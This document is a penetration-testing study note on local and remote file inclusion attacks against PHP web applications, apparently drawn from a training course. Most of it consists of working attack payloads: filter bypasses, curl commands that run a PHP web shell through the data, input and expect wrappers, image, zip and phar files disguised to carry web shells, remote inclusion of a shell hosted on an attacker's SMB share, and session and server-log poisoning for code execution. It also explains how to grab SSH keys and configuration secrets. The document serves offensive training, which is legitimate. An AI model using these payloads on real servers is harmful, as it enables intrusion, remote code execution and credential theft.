## delete


# File Inclusion(FI)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PayLoads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md)

Many modern back-end languages use HTTP parameters to specify what is shown on the web page, which allows for building dynamic web pages, reduces the script's overall size, and simplifies the code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a Local File Inclusion (LFI) vulnerability.


| Function                 | Read Content | Execute | Remote URL |
|--------------------------|--------------|---------|------------|
| **PHP**                  |              |         |            |
| include()/include_once() | ✅            | ✅       | ✅          |
| require()/require_once() | ✅            | ✅       | ❌          |
| file_get_contents()      | ✅            | ❌       | ✅          |
| fopen()/file()           | ✅            | ❌       | ❌          |
| **NodeJS**               |              |         |            |
| fs.readFile()            | ✅            | ❌       | ❌          |
| fs.sendFile()            | ✅            | ❌       | ❌          |
| res.render()             | ✅            | ✅       | ❌          |
| **Java**                 |              |         |            |
| include                  | ✅            | ❌       | ❌          |
| import                   | ✅            | ✅       | ✅          |
| **.NET**                 |              |         |            |
| @Html.Partial()          | ✅            | ❌       | ❌          |
| @Html.RemotePartial()    | ✅            | ❌       | ✅          |
| Response.WriteFile()     | ✅            | ❌       | ❌          |
| include                  | ✅            | ✅       | ✅          |


# Local File Inclusion (LFI)
## Basic Bypasses
### Non-Recursive Path Traversal Filters
One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals. 

If we use ....// as our payload, then the filter would remove ../ and the output string would be ../, which means we may still perform path traversal

### Encoding
Some web filters may prevent input filters that include certain LFI-related characters, like a dot . or a slash / used for path traversals. However, some of these filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function.

If the target web application did not allow . and / in our input, we can URL encode ../ into %2e%2e%2f, which may bypass the filter. To do so, we can use any online URL encoder utility or use the Burp Suite Decoder tool.

Check [Command Injection](./CI.md#bypassing-filters) for more about bypassing various blacklisted characters

### Approved Paths
Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. 

To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality. Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match. To bypass this, we may use path traversal and start our payload with the approved path, and then use ../ to go back to the root directory and read the file we specify.

### Appended Extension
With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful, as we will see in the next section (e.g. for reading source code).

There are a couple of other techniques we may use, but they are obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4. However, it may still be beneficial to mention them, as some web applications may still be running on older servers, and these techniques may be the only bypasses possible.

#### Path Truncation
In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (/etc/passwd/.) then the /. would also be truncated, and PHP would call (/etc/passwd). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. ////etc/passwd is the same as /etc/passwd). Similarly, a current directory shortcut (.) in the middle of the path would also be disregarded (e.g. /etc/./passwd).

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (.php) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.

```bash
$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

We may also increase the count of ../, as adding more would still land us in the root directory, as explained in the previous section. However, if we use this method, we should calculate the full length of the string to ensure only .php gets truncated and not our requested file at the end of the string (/etc/passwd). This is why it would be easier to use the first method.

#### Null Bytes
PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.

To exploit this vulnerability, we can end our payload with a null byte (e.g. /etc/passwd%00), such that the final path passed to include() would be (/etc/passwd%00.php). This way, even though .php is appended to our string, anything after the null byte would be truncated, and so the path used would actually be /etc/passwd, leading us to bypass the appended extension.

## PHP Filters
Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different PHP Wrappers to be able to extend our LFI exploitation, and even potentially reach remote code execution.

### Input Filters
PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with php://filter/.

The filter wrapper has several parameters, but the main ones we require for our attack are resource and read. The resource parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the read parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.

There are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters.

### Fuzzing for PHP Files
The first step would be to fuzz for different available PHP pages.

Even after reading the sources of any identified files, we can scan them for other referenced PHP files, and then read those as well, until we are able to capture most of the web application's source or have an accurate image of what it does. It is also possible to start by reading index.php and scanning it for more references and so on, but fuzzing for PHP files may reveal some files that may not otherwise be found that way.

### Source Code Disclosure
Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the base64 PHP filter. Let's try to read the source code of config.php using the base64 filter, by specifying convert.base64-encode for the read parameter and config for the resource parameter, as follows:
```
php://filter/read=convert.base64-encode/resource=<FILE>
```

We can now decode this string to get the content of the file:
```bash
echo '<BASE64>' | base64 -d
```

`Tip: When copying the base64 encoded string, be sure to copy the entire string or it will not fully decode. You can view the page source to ensure you copy the entire string.`

## PHP Wrappers
We can use many methods to execute remote commands, each of which has a specific use case, as they depend on the back-end language/framework and the vulnerable function's capabilities. One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session. For example, we may find the database password in a file like config.php, which may match a user's password in case they re-use the same password. Or we can check the .ssh directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key (id_rsa) and use it to SSH into the system.

Other than such trivial methods, there are ways to achieve remote code execution directly through the vulnerable function without relying on data enumeration or local file privileges. In this section, we will start with remote code execution on PHP web applications. We will build on what we learned in the previous section, and will utilize different PHP Wrappers to gain remote code execution

### Data
The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.

#### Checking PHP Configurations
To do so, we can include the PHP configuration file found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the base64 filter we used in the previous section, as .ini files are similar to .php files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it.
```bash
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value:
```bash
$ echo '<BASE64>' | base64 -d | grep allow_url_include
```

#### Remote Code Execution
With allow_url_include enabled, we can proceed with our data wrapper attack. As mentioned earlier, the data wrapper can be used to include external data, including PHP code. We can also pass it base64 encoded strings with text/plain;base64, and it has the ability to decode them and execute the PHP code.

So, our first step would be to base64 encode a basic PHP web shell, as follows:
```bash
$ echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with data://text/plain;base64,. Finally, we can use pass commands to the web shell with &cmd=<COMMAND>:
```bash
$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

### Input
Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the allow_url_include setting, as mentione

To repeat our earlier attack but with the input wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:
```bash
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

`Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <\?php system('id')?>)`

### Expect
Finally, we may utilize the expect wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with allow_url_include earlier, but we'd grep for expect instead, and if it is installed and enabled we'd get the following:
```bash
$ echo '<BASE64>' | base64 -d | grep expect
```

```bash
$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

# File Uploads
Image upload is very common in most modern web applications, as uploading images is widely regarded as safe if the upload function is securely coded. However, as discussed earlier, the vulnerability, in this case, is not in the file upload form but the file inclusion functionality.

## Crafting Malicious Image
Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. shell.gif), and should also include the image magic bytes at the beginning of the file content (e.g. GIF8), just in case the upload form checks for both the extension and content type as well. We can do so as follows:
```bash
$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Check [File Upload](./FileUpload.md)


This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.

## Uploaded File Path
Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL.
```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

## Zip Upload
As mentioned earlier, the above technique is very reliable and should work in most cases and with most web frameworks, as long as the vulnerable function allows code execution. There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal. These techniques may become handy in some specific cases where the above technique does not work.

We can utilize the zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named shell.jpg), as follows:
```bash
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

Once we upload the shell.jpg archive, we can include it with the zip wrapper as (zip://shell.jpg), and then refer to any files within it with #shell.php (URL encoded). Finally, we can execute commands as we always do with &cmd=id, as follows:
```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

## Phar Upload
Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:
```bash
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now, we should have a phar file called shell.jpg. Once we upload it to the web application, we can simply call it with phar:// and provide its URL path, and then specify the phar sub-file with /shell.txt (URL encoded) to get the output of the command we specify with (&cmd=id), as follows:
```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

# Remote File Inclusion (RFI)
in some cases, we may also be able to include remote files "Remote File Inclusion (RFI)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:

- Enumerating local-only ports and web applications (i.e. SSRF)
- Gaining remote code execution by including a malicious script that we host

## Verify RFI
In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the allow_url_include setting to be enabled. We can check whether this setting is enabled through LFI  as we did previous. 

However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (http://127.0.0.1:80/index.php) as our input string and see if it gets included:

### Remote Code Execution with RFI
The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell.

Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like 80 or 443, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections. Furthermore, we may host the script through an FTP service or an SMB service.

### HTTP/FTP
If the server requires valid authentication, then the credentials can be specified in the URL, as follows:
```bash
$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

### SMB
```bash
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

# Log Poisoning
Writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.

## PHP Session Poisoning
Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.

The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have a PHPSESSID cookie set to our session:

As we can see, our PHPSESSID cookie value is nhhv8i0o6ua4g88bkdl9u1fdsd, so it should be stored at /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd. Let's try include this session file through the LFI vulnerability and view its contents:
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

Let's try setting the value of page a custom value (e.g. language parameter) and see if it changes in the session file. We can do so by simply visiting the page with ?language=session_poisoning specified, as follows:
```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Now, let's include the session file once again to look at the contents:

This time, the session file contains session_poisoning instead of es.php, which confirms our ability to control the value of page in the session file. Our next step is to perform the poisoning step by writing PHP code to the session file. We can write a basic PHP web shell by changing the ?language= parameter to a URL encoded web shell, as follows:
```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Finally, we can include the session file and use the &cmd=id to execute a commands:
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

`Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.`


## Server Log Poisoning
Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.

By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist to fuzz for their locations, as will be discussed in the next section.

So, let's try including the Apache access log from /var/log/apache2/access.log, and see what we get:

As we can see, we can read the log. The log contains the remote IP address, request page, response code, and the User-Agent header. As mentioned earlier, the User-Agent header is controlled by us through the HTTP request headers, so we should be able to poison this value.

To do so, we will use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to Apache Log Poisoning:
```php
<?php system($_GET['cmd']); ?>
```
As expected, our custom User-Agent value is visible in the included log file. Now, we can poison the User-Agent header by setting it to a basic PHP web shell:

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (&cmd=id):

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

- /var/log/sshd.log
- /var/log/mail
- /var/log/vsftpd.log

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the ssh or ftp services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the mail services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.


# Automated Scanning
It is essential to understand how file inclusion attacks work and how we can manually craft advanced payloads and use custom techniques to reach remote code execution. This is because in many cases, for us to exploit the vulnerability, it may require a custom payload that matches its specific configurations. Furthermore, when dealing with security measures like a WAF or a firewall, we have to apply our understanding to see how a specific payload/character is being blocked and attempt to craft a custom payload to work around it.

## Fuzzing Parameters
Check [Ffuf](../Fuzzing/Ffuf.md#parameters)

## LFI wordlists
There are a number of LFI Wordlists we can use for this scan. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the ?language= parameter we have been testing throughout the module.

## Fuzzing Server Files
In addition to fuzzing LFI payloads, there are different server files that may be helpful in our LFI exploitation, so it would be helpful to know where such files exist and whether we can read them. Such files include: Server webroot path, server configurations file, and server logs.

### Server Webroot
We may need to know the full server webroot path to complete our exploitation in some cases. For example, if we wanted to locate a file we uploaded, but we cannot reach its /uploads directory through relative paths (e.g. ../../uploads). In such cases, we may need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.

To do so, we can fuzz for the index.php file through common webroot paths, which we can find in this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) for Linux or this Discovery/Web-Content/default-web-root-directory-windows.txt for Windows. Depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.

We may also use the same LFI-Jhaddix.txt wordlist we used earlier, as it also contains various payloads that may reveal the webroot. If this does not help us in identifying the webroot, then our best choice would be to read the server configurations, as they tend to contain the webroot and other important information, as we'll see next.

### Server Logs/Configurations
As we have seen in the previous section, we need to be able to identify the correct logs directory to be able to perform the log poisoning attacks we discussed. Furthermore, as we just discussed, we may also need to read the server configurations to be able to identify the server webroot path and other important information (like the logs path!).

To do so, we may also use the LFI-Jhaddix.txt wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of seclists, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:
